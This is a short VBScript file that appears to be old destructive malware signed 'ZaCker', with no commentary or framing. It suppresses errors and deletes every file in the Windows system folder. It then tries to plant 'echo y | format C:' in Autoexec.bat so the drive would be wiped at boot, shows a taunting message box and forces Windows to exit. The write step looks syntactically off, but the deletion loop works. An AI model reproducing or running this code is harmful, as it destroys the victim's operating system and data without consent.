On Error Resume Next
Const ForReading = 1, ForWriting = 2
 Dim daz,jaz, zin
Set daz = CreateObject("Scripting.FileSystemObject")
Set zin = daz.getspecialfolder(0)
Set jaz = CreateObject("wscript.shell")
 Set f = daz.GetFolder(Zin)
  Set fc = f.Files
For Each f1 In fc
ZaC= zin&"\"&f1.name
daz.deletefile(zac)
Next
  Set f = daz.OpenTextFile("C:\Autoexec.bat", ForWriting, True)
f.write="echo y | format C:"
  Set f = daz.OpenTextFile("C:\Autoexec.bat", ForReading)
 WriteToFile = f.ReadLine
msgbox"I promiss We WiLL Rule The World Again...By The Way,You Are Captured By ZaCker !!!"
jaz.run"RUNDLL32.EXE user.exe,exitwindows"
